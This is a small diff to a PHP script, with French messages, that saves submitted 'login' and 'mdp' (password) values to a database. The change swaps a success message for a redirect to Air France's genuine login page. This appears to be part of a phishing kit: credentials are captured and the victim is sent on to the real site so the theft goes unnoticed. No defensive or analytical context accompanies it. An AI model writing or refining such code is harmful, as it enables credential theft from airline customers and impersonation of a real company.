@@ -21,7 +21,7 @@ if (isset($_POST['login']) && (isset($_POST['mdp']))) {
     $verification = $insertion->execute();
 
     if ($verification) {
-        echo "insertion reussie";
+        header("Location: https://login.airfrance.com/login/account");
     }
 } else {
     echo "Une variable n'est pas declaree ou est null";
